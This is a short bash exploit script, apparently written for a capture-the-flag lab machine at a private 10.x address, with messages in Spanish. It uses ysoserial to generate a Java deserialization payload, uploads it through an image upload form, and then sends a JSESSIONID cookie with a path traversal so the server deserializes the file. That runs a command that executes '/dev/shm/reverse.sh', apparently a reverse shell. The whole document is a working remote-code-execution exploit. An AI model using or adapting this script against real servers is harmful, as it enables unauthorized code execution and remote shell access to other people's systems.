#!/bin/bash
 
function ctrl_c(){
    echo -e "\n[!] Saliendo...\n"
    exit 1
}
 
# Ctrl+C
trap ctrl_c INT
 
declare -r main_url="http://10.10.10.205:8080/upload.jsp?email=test@test.com"
declare -r rce_url="http://10.10.10.205:8080/"
declare -r command="bash /dev/shm/reverse.sh"
 
if [ $1 ]; then
    payloadType=$1
    java -jar ysoserial.jar $payloadType "$command" > $payloadType.session
    curl -s -X POST -F "image=@$payloadType.session" $main_url &>/dev/null
    curl -s -X GET --cookie "JSESSIONID=../../../../../../../opt/samples/uploads/$payloadType" $rce_url &>/dev/null
else
    echo -e "\n[!] Uso: $0 payloadType\n"
    exit 1
fi
